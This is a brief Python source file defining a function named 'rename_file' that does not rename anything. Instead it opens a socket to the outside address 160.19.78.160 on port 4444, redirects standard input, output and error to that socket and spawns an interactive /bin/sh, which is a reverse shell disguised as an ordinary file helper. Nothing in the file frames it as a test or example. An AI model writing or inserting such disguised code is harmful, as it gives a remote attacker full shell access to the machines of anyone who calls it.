import socket,subprocess,os

def rename_file(a, b):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("160.19.78.160",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
